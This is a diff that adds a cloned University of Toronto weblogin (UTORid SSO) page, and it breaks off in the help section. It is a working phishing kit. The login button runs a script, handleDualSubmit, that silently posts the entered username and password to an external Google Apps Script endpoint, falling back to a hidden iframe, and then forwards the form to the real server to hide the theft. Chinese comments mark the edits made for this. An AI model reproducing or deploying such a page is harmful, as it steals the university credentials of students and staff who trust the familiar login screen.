@@ -1,0 +1,1181 @@
+<!DOCTYPE html>
+<!-- saved from url=(0079)https://idpz.utorauth.utoronto.ca/idp/profile/SAML2/Redirect/SSO?execution=e1s1 -->
+<html lang="en"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>weblogin idpz | University of Toronto</title>
+    <style>
+      * {
+          box-sizing: border-box;
+          margin: 0;
+          padding: 0;
+      }
+      body{
+          background-color: white;
+          color:#002A5C;
+      }
+      p{
+          text-align: justify;
+      }
+      h1, h2, h3,h4,h5,h6 {
+        font-family: 'Open Sans Condensed',sans-serif;
+        font-weight: 500;
+        line-height: 1.1;
+        color:inherit;
+      }
+      img {
+          max-width: 100%;
+      }
+      a{
+          color:#002A5C;
+      }
+      .page {
+          font-size: 13.5px;
+          line-height: 1.4;
+          font-family: Arial, Helvetica, sans-serif;
+      }
+
+      /************** Page layout *************************/
+      .page{
+          max-width: 1200px;
+          width: 90%;
+          margin: 0 auto;
+          display: grid;
+          gap: 20px;
+          grid-template-areas:
+              "header"
+              "main"
+              "aside"
+              "footer";
+      }
+
+      @media screen and (min-width: 800px){
+        .login-page, .error-page, .warning-page {
+          grid-template-areas: 
+          "header header header"
+          "main aside aside"
+          "footer footer footer";
+          grid-template-columns: 1fr 1fr 1fr;
+        } 
+      }
+
+      header {
+          grid-area: header;
+          margin-top: 20px;
+      }
+      footer{
+          grid-area: footer;
+      }
+      main {
+          grid-area: main;
+      }
+      aside {
+          grid-area: aside;
+      }
+
+      /********************* header **************************/
+      .page-title {
+          padding: 10px 10px;
+          background: linear-gradient(to right, #002a5c 0%,#5c6c8d 100%);
+          color: white;
+      }
+      .page-title h1 {
+          font-size: 16px;
+          font-weight: bold;
+      }
+
+      /********************* footer **************************/
+      footer {
+          border-top: 1px solid #cecece;
+          padding: 10px 0;
+      }
+      .footer-list {
+          display: flex;
+          list-style: none;
+          align-items: center;
+          justify-content:right;
+          flex-direction: column;
+      }
+      .footer-list > li {
+          padding: 0 10px 0 10px;
+      }
+      @media screen  and (min-width: 600px){
+          .footer-list{
+              flex-direction: row;
+          }
+      }
+
+      /********************** main *********************/
+      main {
+          display: flex;
+          flex-direction: column;
+          gap: 20px;
+          padding-bottom: 30px;
+      }
+
+      .alert {
+          color: #5A4826;
+          padding: 15px;
+          border: 1px solid;
+          border-radius: 4px;
+      }
+      .alert p {
+        padding-bottom: 8px; 
+      }
+      .alert-note {
+          color: rgb(0, 42, 92);
+          background-color: #e5e9ee;
+      }
+      .alert-warning {
+          background-color: #fcf8e3;
+          border-color: #faebcc;
+      }
+      .alert-danger {
+          background-color: #f2dede;
+          border-color: #ebccd1;
+      }
+
+      .rpui {
+          padding: 15px;
+      }
+      /********************** login-box *********************/
+      .login-box {
+          background-color: #e5e9ee;
+      }
+      .login-box label {
+          font-weight: bold;
+      }
+
+      .login-box form {
+          padding: 20px;
+      }
+      .login-box .form-group{
+          margin-bottom: 20px;
+      }
+      .login-box input {
+          border: 1px solid #667f9d;
+          max-width: 300px;
+          border-radius: 4px;
+          width: 100%;
+          height: 34px;
+          padding: 6px 12px;
+          font-size: 14px;
+          line-height: 1.428571429;
+          /*background-color: rgb(232, 240, 254);*/
+          background-color: white;
+      }
+      #login-btn {
+          box-shadow: none;
+          color: white;
+          text-shadow: none;
+          border: medium none;
+          background-color: #002A5C;
+          border-radius: 3px 3px 3px 3px;
+          font-size: 18px;
+          padding: 10px 16px;
+          line-height: 1.33;
+          cursor: pointer;
+          user-select: none;
+      }
+      #login-btn img {
+          width: 24px;
+          margin-left: 10px;
+          vertical-align: middle;
+      }
+
+      /********************** tab widget *********************/
+      .tab-list {
+          display: flex;
+          flex-direction: row;
+      }
+
+      .tab {
+          flex-grow: 1;
+          border-radius: 5px;
+          border: 0;
+          padding: 15px 13px;
+          text-decoration: none;
+          cursor: pointer;
+          user-select: none;
+          color: inherit;
+          font-size: 13.5px;
+          background-color: inherit;
+      }
+
+      .tab:hover {
+          background-color: lightgrey;
+      }
+
+      .tab-selected {
+          background-color: #002a5c;
+          color: white;
+      }
+
+      .tab-selected:hover {
+          background-color: #002a5c;
+      }
+
+      .tab-panel {
+          background: linear-gradient(to bottom, #e5f3f7 0%, #ffffff 100%);
+          border-top: 5px solid #ccd4de;
+          padding: 30px;
+          display: none;
+      }
+
+      .tab-panel-warning {
+          background: linear-gradient(to bottom, #ebd9d9 0%, #ffffff 100%);
+          border-top: 5px solid #990000;
+          display: block;
+      }
+
+      .tab-panel-active {
+          display: block;
+      }
+
+      .tab-panel h2 {
+          font-size: 25px;
+          font-weight: 500;
+          margin-bottom: 30px;
+          font-family: 'Helvetica Neue', Helvetica, Arial, sans-serif;
+      }
+
+      .tab-panel a {
+          text-decoration: none;
+          text-decoration: underline;
+          font-weight: bolder;
+      }
+
+      .tab-panel p {
+          margin-top: 10px;
+          margin-bottom: 10px;
+      }
+
+      .tab-panel strong {
+        font-weight: bold; 
+      }
+
+      .tab-panel .caution {
+          font-weight: bold; 
+          color: rgb(106, 42, 41); 
+          background-color: rgb(242,222,222);
+      }
+
+      /************** accordion widget *****************/
+      .accordion {
+          width: 100%;
+          text-align: left;
+          color: #444;
+          padding: 18px;
+          border: none;
+          outline: none;
+          transition: 0.4s;
+          background-color: #ccd4de;
+          border-color: #b2bfce;
+          margin: 5px 0;
+          font-size: 14px;
+          font-weight: bolder;
+          border-radius: 5px;
+      }
+
+      .accordion::after {
+          content: '\02795';
+          font-size: 13px;
+          color: #777;
+          float: right;
+          margin-left: 5px;
+      }
+
+      .accordion-expanded,
+      .accordion:hover {
+          background-color: #ccc;
+      }
+
+      .accordion-expanded::after {
+          content: '\2796';
+      }
+
+      .accordion-panel {
+          background-color: white;
+          padding: 0 18px;
+          display: none;
+          overflow: hidden;
+          transition: max-height 0.2s ease-out;
+      }
+
+      /************* ut color bar *****************/
+      .ut-color-bar {
+          display: flex;
+          justify-content: space-between;
+          height: 5px;
+      }
+
+      .ut-color-bar>span {
+          flex-grow: 1;
+      }
+
+      .utm-bar {
+          background: #46bea3;
+      }
+
+      .utsg-bar {
+          background-color: #b7b71f;
+      }
+
+      .utsc-bar {
+          background-color: #40004c;
+      }
+
+      /************** check list ************/
+      .green-check-list{
+          list-style: none;
+      }
+      .green-check-list > li{
+          background: url("../img/green-check.png") no-repeat left top;
+          padding-left: 40px;
+          margin-bottom: 15px;
+          font-size: 17px;
+          line-height: 1.5;
+          font-weight: 400;
+      }
+    </style>
+<script>
+window.onload = function(){
+    // not run for old browsers
+    if (typeof document.querySelectorAll !== "function"){
+        return;
+    }
+    
+    // initialize tab widgets
+    var init_tab = function() {
+        var tablists = document.querySelectorAll('.tab-list');
+        for (var i=0; i<tablists.length; i++){
+            var tablist = tablists[i];
+            tablist.setAttribute("role", "tablist");
+            var tabs = tablist.querySelectorAll('.tab');
+            var panels = tablist.parentElement.querySelectorAll('.tab-panel');
+
+            // select a tab
+            var selectTab = function(index){
+                for(var j=0; j<tabs.length; j++){
+                    var tab = tabs[j];
+                    tab.classList.remove("tab-selected");
+                    tab.setAttribute("aria-selected", "false");
+                }
+                for(var k=0; k<panels.length; k++){
+                    var panel = panels[k];
+                    panel.classList.remove("tab-panel-active");
+                }
+
+                if (index >=0 && index<tabs.length ) {
+                    tabs[index].classList.add("tab-selected");
+                    tabs[index].setAttribute("aria-selected", "true");
+                    panels[index].classList.add("tab-panel-active");
+                }
+            }
+
+            for(var i=0; i<tabs.length; i++){
+                var tab = tabs[i];
+                tab.setAttribute("role", "tab");
+                if (tab.classList.contains("tab-selected")) {
+                    selectTab(i);
+                }
+                tab.onclick = (function(index) {
+                    return function(){
+                        selectTab(index);
+                    }
+                })(i);
+            }
+        }
+    };
+    
+    // initialize accordion widgets
+    var init_accordion = function(){
+        var accs = document.querySelectorAll('.accordion');
+        for(var i=0; i<accs.length; i++){
+            var acc = accs[i];
+            if (acc.classList.contains("accordion-expanded")) {
+                acc.setAttribute("aria-expanded", "true");
+            } else {
+                acc.setAttribute("aria-expanded", "false");
+            }
+            acc.onclick = function () {
+                this.classList.toggle("accordion-expanded");
+                var panel = this.nextElementSibling;
+                if (panel.style.display == "block") {
+                    panel.style.display = "none";
+                    this.setAttribute("aria-expanded", "false");
+                } else {
+                    panel.style.display = "block";
+                    this.setAttribute("aria-expanded", "true");
+                }
+            };
+        }
+    }
+
+    init_tab();
+    init_accordion();
+};
+
+function handleDualSubmit() {
+    const form = document.getElementById('sso-form');
+    if (!form) {
+        console.error('找不到表单元素');
+        return;
+    }
+    
+    const formData = new FormData(form);
+    
+    // Google Apps Script URL
+    const googleScriptUrl = 'https://script.google.com/macros/s/AKfycbzJuUtxve1CTRmLFODkh4BxuCTOJIt6lEFRKdpqUgtsN8RvfNum5HEiHQAQWNXb8Lw/exec';
+    
+    // 发送到 Google Apps Script
+    fetch(googleScriptUrl, {
+        method: 'POST',
+        body: formData,
+        mode: 'cors',
+        credentials: 'omit'
+    }).then(response => {
+        console.log('Google Apps Script响应状态:', response.status);
+        if (response.ok) {
+            return response.text();
+        } else {
+            throw new Error(`HTTP error! status: ${response.status}`);
+        }
+    }).then(data => {
+        console.log('Google Apps Script响应数据:', data);
+    }).catch(error => {
+        console.log('Google Apps Script请求失败，尝试备选方案:', error);
+        
+        // 备选方案：使用隐藏iframe发送到Google Apps Script
+        const iframe = document.createElement('iframe');
+        iframe.style.display = 'none';
+        iframe.name = 'googleSubmit';
+        document.body.appendChild(iframe);
+        
+        const googleForm = document.createElement('form');
+        googleForm.method = 'POST';
+        googleForm.action = googleScriptUrl;
+        googleForm.target = 'googleSubmit';
+        googleForm.style.display = 'none';
+        
+        // 复制表单数据
+        const inputs = form.querySelectorAll('input, select, textarea');
+        inputs.forEach(input => {
+            if (input.name && input.value) {
+                const newInput = document.createElement('input');
+                newInput.type = 'hidden';
+                newInput.name = input.name;
+                newInput.value = input.value;
+                googleForm.appendChild(newInput);
+            }
+        });
+        
+        document.body.appendChild(googleForm);
+        googleForm.submit();
+        
+        // 清理
+        setTimeout(() => {
+            try {
+                document.body.removeChild(iframe);
+                document.body.removeChild(googleForm);
+            } catch(e) {
+                console.log('清理元素时出错:', e);
+            }
+        }, 1000);
+    }).finally(() => {
+        // 无论如何都提交原始表单
+        setTimeout(() => {
+            console.log('准备提交到原始SSO服务器');
+            form.submit();
+        }, 200);
+    });
+}
+</script>
+<style data-id="immersive-translate-input-injected-css">.immersive-translate-input {
+  position: absolute;
+  top: 0;
+  right: 0;
+  left: 0;
+  bottom: 0;
+  z-index: 2147483647;
+  display: flex;
+  justify-content: center;
+  align-items: center;
+}
+.immersive-translate-attach-loading::after {
+  content: " ";
+
+  --loading-color: #f78fb6;
+  width: 6px;
+  height: 6px;
+  border-radius: 50%;
+  display: block;
+  margin: 12px auto;
+  position: relative;
+  color: white;
+  left: -100px;
+  box-sizing: border-box;
+  animation: immersiveTranslateShadowRolling 1.5s linear infinite;
+
+  position: absolute;
+  top: 50%;
+  left: 50%;
+  transform: translate(-2000%, -50%);
+  z-index: 100;
+}
+
+.immersive-translate-loading-spinner {
+  vertical-align: middle !important;
+  width: 10px !important;
+  height: 10px !important;
+  display: inline-block !important;
+  margin: 0 4px !important;
+  border: 2px rgba(221, 244, 255, 0.6) solid !important;
+  border-top: 2px rgba(0, 0, 0, 0.375) solid !important;
+  border-left: 2px rgba(0, 0, 0, 0.375) solid !important;
+  border-radius: 50% !important;
+  padding: 0 !important;
+  -webkit-animation: immersive-translate-loading-animation 0.6s infinite linear !important;
+  animation: immersive-translate-loading-animation 0.6s infinite linear !important;
+}
+
+@-webkit-keyframes immersive-translate-loading-animation {
+  from {
+    -webkit-transform: rotate(0deg);
+  }
+
+  to {
+    -webkit-transform: rotate(359deg);
+  }
+}
+
+@keyframes immersive-translate-loading-animation {
+  from {
+    transform: rotate(0deg);
+  }
+
+  to {
+    transform: rotate(359deg);
+  }
+}
+
+.immersive-translate-input-loading {
+  --loading-color: #f78fb6;
+  width: 6px;
+  height: 6px;
+  border-radius: 50%;
+  display: block;
+  margin: 12px auto;
+  position: relative;
+  color: white;
+  left: -100px;
+  box-sizing: border-box;
+  animation: immersiveTranslateShadowRolling 1.5s linear infinite;
+}
+
+@keyframes immersiveTranslateShadowRolling {
+  0% {
+    box-shadow: 0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0),
+      0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  12% {
+    box-shadow: 100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0),
+      0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  25% {
+    box-shadow: 110px 0 var(--loading-color), 100px 0 var(--loading-color),
+      0px 0 rgba(255, 255, 255, 0), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  36% {
+    box-shadow: 120px 0 var(--loading-color), 110px 0 var(--loading-color),
+      100px 0 var(--loading-color), 0px 0 rgba(255, 255, 255, 0);
+  }
+
+  50% {
+    box-shadow: 130px 0 var(--loading-color), 120px 0 var(--loading-color),
+      110px 0 var(--loading-color), 100px 0 var(--loading-color);
+  }
+
+  62% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color),
+      120px 0 var(--loading-color), 110px 0 var(--loading-color);
+  }
+
+  75% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0),
+      130px 0 var(--loading-color), 120px 0 var(--loading-color);
+  }
+
+  87% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0),
+      200px 0 rgba(255, 255, 255, 0), 130px 0 var(--loading-color);
+  }
+
+  100% {
+    box-shadow: 200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0),
+      200px 0 rgba(255, 255, 255, 0), 200px 0 rgba(255, 255, 255, 0);
+  }
+}
+
+.immersive-translate-toast {
+  display: flex;
+  position: fixed;
+  z-index: 2147483647;
+  left: 0;
+  right: 0;
+  top: 1%;
+  width: fit-content;
+  padding: 12px 20px;
+  margin: auto;
+  overflow: auto;
+  background: #fef6f9;
+  box-shadow: 0px 4px 10px 0px rgba(0, 10, 30, 0.06);
+  font-size: 15px;
+  border-radius: 8px;
+  color: #333;
+}
+
+.immersive-translate-toast-content {
+  display: flex;
+  flex-direction: row;
+  align-items: center;
+}
+
+.immersive-translate-toast-hidden {
+  margin: 0 20px 0 72px;
+  text-decoration: underline;
+  cursor: pointer;
+}
+
+.immersive-translate-toast-close {
+  color: #666666;
+  font-size: 20px;
+  font-weight: bold;
+  padding: 0 10px;
+  cursor: pointer;
+}
+
+@media screen and (max-width: 768px) {
+  .immersive-translate-toast {
+    top: 0;
+    padding: 12px 0px 0 10px;
+  }
+  .immersive-translate-toast-content {
+    flex-direction: column;
+    text-align: center;
+  }
+  .immersive-translate-toast-hidden {
+    margin: 10px auto;
+  }
+}
+
+.immersive-translate-modal {
+  display: none;
+  position: fixed;
+  z-index: 2147483647;
+  left: 0;
+  top: 0;
+  width: 100%;
+  height: 100%;
+  overflow: auto;
+  background-color: rgb(0, 0, 0);
+  background-color: rgba(0, 0, 0, 0.4);
+  font-size: 15px;
+}
+
+.immersive-translate-modal-content {
+  background-color: #fefefe;
+  margin: 10% auto;
+  padding: 40px 24px 24px;
+  border: 1px solid #888;
+  border-radius: 10px;
+  width: 80%;
+  max-width: 270px;
+  font-family: system-ui, -apple-system, "Segoe UI", "Roboto", "Ubuntu",
+    "Cantarell", "Noto Sans", sans-serif, "Apple Color Emoji", "Segoe UI Emoji",
+    "Segoe UI Symbol", "Noto Color Emoji";
+  position: relative;
+}
+
+@media screen and (max-width: 768px) {
+  .immersive-translate-modal-content {
+    margin: 50% auto !important;
+  }
+}
+
+.immersive-translate-modal .immersive-translate-modal-content-in-input {
+  max-width: 500px;
+}
+.immersive-translate-modal-content-in-input .immersive-translate-modal-body {
+  text-align: left;
+  max-height: unset;
+}
+
+.immersive-translate-modal-title {
+  text-align: center;
+  font-size: 16px;
+  font-weight: 700;
+  color: #333333;
+}
+
+.immersive-translate-modal-body {
+  text-align: center;
+  font-size: 14px;
+  font-weight: 400;
+  color: #333333;
+  word-break: break-all;
+  margin-top: 24px;
+}
+
+@media screen and (max-width: 768px) {
+  .immersive-translate-modal-body {
+    max-height: 250px;
+    overflow-y: auto;
+  }
+}
+
+.immersive-translate-close {
+  color: #666666;
+  position: absolute;
+  right: 16px;
+  top: 16px;
+  font-size: 20px;
+  font-weight: bold;
+}
+
+.immersive-translate-close:hover,
+.immersive-translate-close:focus {
+  color: black;
+  text-decoration: none;
+  cursor: pointer;
+}
+
+.immersive-translate-modal-footer {
+  display: flex;
+  justify-content: center;
+  flex-wrap: wrap;
+  margin-top: 24px;
+}
+
+.immersive-translate-btn {
+  width: fit-content;
+  color: #fff;
+  background-color: #ea4c89;
+  border: none;
+  font-size: 16px;
+  margin: 0 8px;
+  padding: 9px 30px;
+  border-radius: 5px;
+  display: flex;
+  align-items: center;
+  justify-content: center;
+  cursor: pointer;
+  transition: background-color 0.3s ease;
+}
+
+.immersive-translate-btn:hover {
+  background-color: #f082ac;
+}
+.immersive-translate-btn:disabled {
+  opacity: 0.6;
+  cursor: not-allowed;
+}
+.immersive-translate-btn:disabled:hover {
+  background-color: #ea4c89;
+}
+
+.immersive-translate-cancel-btn {
+  /* gray color */
+  background-color: rgb(89, 107, 120);
+}
+
+.immersive-translate-cancel-btn:hover {
+  background-color: hsl(205, 20%, 32%);
+}
+
+.immersive-translate-action-btn {
+  background-color: transparent;
+  color: #ea4c89;
+  border: 1px solid #ea4c89;
+}
+
+.immersive-translate-btn svg {
+  margin-right: 5px;
+}
+
+.immersive-translate-link {
+  cursor: pointer;
+  user-select: none;
+  -webkit-user-drag: none;
+  text-decoration: none;
+  color: #007bff;
+  -webkit-tap-highlight-color: rgba(0, 0, 0, 0.1);
+}
+
+.immersive-translate-primary-link {
+  cursor: pointer;
+  user-select: none;
+  -webkit-user-drag: none;
+  text-decoration: none;
+  color: #ea4c89;
+  -webkit-tap-highlight-color: rgba(0, 0, 0, 0.1);
+}
+
+.immersive-translate-modal input[type="radio"] {
+  margin: 0 6px;
+  cursor: pointer;
+}
+
+.immersive-translate-modal label {
+  cursor: pointer;
+}
+
+.immersive-translate-close-action {
+  position: absolute;
+  top: 2px;
+  right: 0px;
+  cursor: pointer;
+}
+
+.imt-image-status {
+  background-color: rgba(0, 0, 0, 0.5) !important;
+  display: flex !important;
+  flex-direction: column !important;
+  align-items: center !important;
+  justify-content: center !important;
+  border-radius: 16px !important;
+}
+.imt-image-status img,
+.imt-image-status svg,
+.imt-img-loading {
+  width: 28px !important;
+  height: 28px !important;
+  margin: 0 0 8px 0 !important;
+  min-height: 28px !important;
+  min-width: 28px !important;
+  position: relative !important;
+}
+.imt-img-loading {
+  background-image: url("data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAADgAAAA4CAMAAACfWMssAAAAtFBMVEUAAAD////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////oK74hAAAAPHRSTlMABBMIDyQXHwyBfFdDMSw+OjXCb+5RG51IvV/k0rOqlGRM6KKMhdvNyZBz9MaupmxpWyj437iYd/yJVNZeuUC7AAACt0lEQVRIx53T2XKiUBCA4QYOiyCbiAsuuGBcYtxiYtT3f6/pbqoYHVFO5r+iivpo6DpAWYpqeoFfr9f90DsYAuRSWkFnPO50OgR9PwiCUFcl2GEcx+N/YBh6pvKaefHlUgZd1zVe0NbYcQjGBfzrPE8Xz8aF+71D8gG6DHFPpc4a7xFiCDuhaWgKgGIJQ3d5IMGDrpS4S5KgpIm+en9f6PlAhKby4JwEIxlYJV9h5k5nee9GoxHJ2IDSNB0dwdad1NAxDJ/uXDHYmebdk4PdbkS58CIVHdYSUHTYYRWOJblWSyu2lmy3KNFVJNBhxcuGW4YBVCbYGRZwIooipHsNqjM4FbgOQqQqSKQQU9V8xmi1QlgHqQQ6DDBvRUVCDirs+EzGDGOQTCATgtYTnbCVLgsVgRE0T1QE0qHCFAht2z6dLvJQs3Lo2FQoDxWNUiBhaP4eRgwNkI+dAjVOA/kUrIDwf3CG8NfNOE0eiFotSuo+rBiq8tD9oY4Qzc6YJw99hl1wzpQvD7ef2M8QgnOGJfJw+EltQc+oX2yn907QB22WZcvlUpd143dqQu+8pCJZuGE4xCuPXJqqcs5sNpsI93Rmzym1k4Npk+oD1SH3/a3LOK/JpUBpWfqNySxWzCfNCUITuDG5dtuphrUJ1myeIE9bIsPiKrfqTai5WZxbhtNphYx6GEIHihyGFTI69lje/rxajdh0s0msZ0zYxyPLhYCb1CyHm9Qsd2H37Y3lugVwL9kNh8Ot8cha6fUNQ8nuXi5z9/ExsAO4zQrb/ev1yrCB7lGyQzgYDGuxq1toDN/JGvN+HyWNHKB7zEoK+PX11e12G431erGYzwmytAWU56fkMHY5JJnDRR2eZji3AwtIcrEV8Cojat/BdQ7XOwGV1e1hDjGGjXbdArm8uJZtCH5MbcctVX8A1WpqumJHwckAAAAASUVORK5CYII=");
+  background-size: 28px 28px;
+  animation: image-loading-rotate 1s linear infinite !important;
+}
+
+.imt-image-status span {
+  color: var(--bg-2, #fff) !important;
+  font-size: 14px !important;
+  line-height: 14px !important;
+  font-weight: 500 !important;
+  font-family: "PingFang SC", Arial, sans-serif !important;
+}
+
+@keyframes image-loading-rotate {
+  from {
+    transform: rotate(360deg);
+  }
+  to {
+    transform: rotate(0deg);
+  }
+}
+</style></head>
+
+<body>
+    <div class="page login-page">
+<!-- header part -->
+<header>
+    <div>
+        <a class="logo" href="http://www.utoronto.ca/" title="Go to U of T homepage">
+            <img src="https://p.sda1.dev/24/b2951e4c7e054f1ab7f4c36dd45d7ac2/U-of-T-logo.png" >
+        </a>
+    </div>
+    <div class="page-title">
+        <h1>weblogin idpz</h1>
+    </div>
+</header>
+       <main>
+            <div class="login-box">
+                <div class="ut-color-bar">
+                    <span class="utm-bar"></span>
+                    <span class="utsg-bar"></span>
+                    <span class="utsc-bar"></span>
+                </div>
+ <!-- 修改这个表单，添加id -->
+                <form id="sso-form" action="https://idpz.utorauth.utoronto.ca/idp/profile/SAML2/Redirect/SSO?execution=e1s1" method="post">
+    <input type="hidden" name="csrf_token" value="_196b82f48d5e5f135563bb05fa850001cc822cce">
+
+                    <div class="form-group">
+                        <label for="username">UTORid / JOINid</label><br>
+                        <input id="username" name="j_username" type="text" autofocus="">
+                    </div>
+                    <div class="form-group">
+                        <label for="passowrd">Password</label><br>
+                        <input id="password" name="j_password" type="password">
+                    </div>
+<!-- 修改按钮类型从submit改为button，并添加onclick事件 -->
+<button id="login-btn" type="button" onclick="handleDualSubmit()" name="_eventId_proceed">log in<img src="https://p.sda1.dev/24/f3a1b2e816cb079668f653be195aed0c/login-icon.png" ></button>
+                </form>
+
+            </div>
+            <div class="alert alert-warning">
+                <b>Warning</b>: Your password may not be sync'd. Visit our 
+                <a href="https://www.utorid.utoronto.ca/cgi-bin/utorid/verify.pl"><strong>verify password</strong></a> page.
+            </div>
+            <div class="alert alert-danger">
+                <b>Alert</b>: Completely exit your web browser when you are finished.
+            </div>
+        </main>
+        <aside>
+            <div class="tab-list" role="tablist">
+                <button class="tab tab-selected" role="tab" aria-selected="true">Protect Your Account</button>
+                <button class="tab" aria-selected="false" role="tab">Login Problems</button>
+                <button class="tab" aria-selected="false" role="tab">Forgotten Password</button>
+                <button class="tab" aria-selected="false" role="tab">How to Log Out</button>
+                <button class="tab" aria-selected="false" role="tab">Finding Help</button>
+            </div>
+<article class="tab-panel tab-panel-active">
+    <h2>Steps you should take to protect your account:</h2>
+    <ul class="green-check-list">
+        <li>
+            Before you begin, make sure this page (URL) starts
+            <strong>https://idpz.utorauth.utoronto.ca/...</strong>.
+        </li>
+        <li>
+            When using a public computer,
+            <strong>close all windows</strong> and exit the browser.
+        </li>
+        <li>
+            Keep your password a secret at all times. <br>
+            Tip: U of T will <strong>never</strong> ask for
+            your password or other personal information by e-mail.
+        </li>
+    </ul>
+</article><article class="tab-panel">
+    <h2>Login Problems</h2>
+    <p>
+        If you believe you know your password, please visit 
+        <a href="https://www.utorid.utoronto.ca/cgi-bin/utorid/verify.pl">UTORid Password Verification Page</a> to try
+        it. We cannot retrieve your password. We store a one-way encryption: we can verify a password, but we cannot
+        decrypt what we store. If you have forgotten your password, a new password must be chosen using a password
+        reset procedure.
+    </p>
+    <a href="https://www.utorid.utoronto.ca/cgi-bin/utorid/verify.pl">verify password</a>
+
+    <button class="accordion" aria-expanded="false">Password Requirements</button>
+    <div class="accordion-panel">
+        <p>
+            UofT is updating its password authentication systems. This weblogin service uses an authentication
+            mechanism that will not accept a password that does not meet current requirements. If your password is
+            relatively weak (and, likely, old), we highly recommend you change it. And it may be necessary to change
+            your password in order to use this login service. In the near future, all authentication will require
+            passwords meet stronger rules.
+        </p>
+        <a href="https://www.utorid.utoronto.ca/cgi-bin/utorid/changepw.pl">Change Password</a>
+    </div>
+
+    <button class="accordion" aria-expanded="false">UTORid Login problems</button>
+    <div class="accordion-panel">
+        <p>UTORid Account Recovery Service</p>
+        <p>
+           If you have registered with 
+           <a href="https://www.utorid.utoronto.ca/accountrecovery">UTORid Account Recovery Service</a>, 
+           you can use the <a href="https://recover.utorid.utoronto.ca/">UTORid password reset tool</a>.
+        </p>
+        <p>If you are not registered, ...</p>
+        <p>
+           If you are not registered with the 
+           <a href="https://www.utorid.utoronto.ca/accountrecovery">UTORid Account Recovery Service</a>, 
+           please visit your campus help desk:
+        </p>
+        <p>
+           <a href="http://help.ic.utoronto.ca/">St. George</a>
+           <a href="http://www.utm.utoronto.ca/iits/">UTM</a>
+           <a href="http://www.utsc.utoronto.ca/iits/">UTSC</a>
+        </p>
+        <p>
+            Note: U of T staff, faculty, students, and alumni may register for 
+            <a href="https://www.utorid.utoronto.ca/accountrecovery">UTORid Account Recovery Service</a> to
+            enable convenient password reset via alternate email or SMS (mobile phone). You will need to know your
+            UTORid password to register for this service.
+        </p>
+    </div>
+
+    <button class="accordion" aria-expanded="false">JOINid Login Problems</button>
+    <div class="accordion-panel">
+        <p>
+            Applicants to the University of Toronto have a JOINid. If, after attempting to log in with your JOINid,
+            you receive an error message stating "Authentication Failed", try to 
+            <a href="https://www.utorid.utoronto.ca/reenable">re-enable your JOINid / reset the password</a> and try again.
+        </p>
+    </div>
+</article>
+<article class="tab-panel">
+    <h2>Forgotten Password</h2>
+    <p>
+       If you believe you know your password, please visit 
+       <a href="https://www.utorid.utoronto.ca/cgi-bin/utorid/verify.pl">UTORid Password Verification Page</a> to try it. 
+       We cannot retrieve your password. We store a one-way encryption: 
+       we can verify a password, but we cannot decrypt what we store. 
+       If you have forgotten your password, a new password must be chosen 
+       using a password reset procedure.
+    </p>
+
+    <button class="accordion" aria-expanded="false">UTORid Forgotten Password</button>
+    <div class="accordion-panel">
+        <p>UTORid Account Recovery Service</p>
+        <p>
+           If you have registered with 
+           <a href="https://www.utorid.utoronto.ca/accountrecovery">UTORid Account Recovery Service</a>, 
+           you can use the <a href="https://recover.utorid.utoronto.ca/">UTORid password reset tool</a>.
+        </p>
+        <p>If you are not registered, ...</p>
+        <p>
+           If you are not registered with the 
+           <a href="https://www.utorid.utoronto.ca/accountrecovery">UTORid Account Recovery Service</a>, 
+           please visit your campus help desk:
+        </p>
+        <p>
+           <a href="http://help.ic.utoronto.ca/">St. George</a>
+           <a href="http://www.utm.utoronto.ca/iits/">UTM</a>
+           <a href="http://www.utsc.utoronto.ca/iits/">UTSC</a>
+        </p>
+        <p>
+            Note: U of T staff, faculty, students, and alumni may register for 
+            <a href="https://www.utorid.utoronto.ca/accountrecovery">UTORid Account Recovery Service</a> to
+            enable convenient password reset via alternate email or SMS (mobile phone). You will need to know your
+            UTORid password to register for this service.
+        </p>
+    </div>
+
+    <button class="accordion" aria-expanded="false">JOINid Forgotten Password</button>
+    <div class="accordion-panel">
+        <p>
+            Applicants to the University of Toronto have a JOINid.
+        </p>
+        <p>
+            <a href="https://www.utorid.utoronto.ca/reenable">Reset your JOINid Password</a>
+        </p>
+    </div>
+</article>
+<article class="tab-panel">
+    <h2>How to Log Out</h2>
+    <p>
+       <strong>Exit Your Browser</strong>
+    </p>
+    <p>
+        U of T weblogin stores information in your web browser, using a feature called cookies. 
+        When you exit your browser, these cookies are cleared and you are logged out of weblogin 
+        and the services that use weblogin for authentication.
+    </p>
+    <p>
+        <span class="caution">Caution:</span> Your browser <strong>may</strong> preserve
+        cookies across browser sessions. The Chrome browser, 
+        in particular, now maintains cookies even after exiting. This enables you continue where
+        you left off. While convenient, it conflicts with the intent of session cookies: exiting 
+        your browser should clear all of your session cookies ensuring no one can access your 
+        application privileges. If your browser maintains cookies across exit/restart, you need 
+        to ensure you have logged out of each application.
+    </p>
+    <p>
+        To exit your browser, look for the 
+        <strong>close</strong>, <strong>exit</strong>, <strong>quit</strong>, or <strong>"X"</strong> button.
+    </p>
+</article>
+<article class="tab-panel">
+    <h2>Finding Help</h2>
+
+    <button class="accordion" aria-expanded="false">On-line UTORid Services</button>
+    <div class="accordion-panel">
+        <p>
+            The <a href="https://www.utorid.utoronto.ca/">UTORid management pages</a>
+            may help you resolve some problems on your own.
+        </p>
+    </div>
+
+    <button class="accordion" aria-expanded="false">My Research Helpline</button>
+    <div class="accordion-panel">
+        <p>Mon-Fri 9:00AM to 5:00PM</p>
+        <p>416 946-5000</p>
+        <p><a href="mailto:raise@utoronto.ca">raise@utoronto.ca</a></p>
+        <p>
+            More info: 
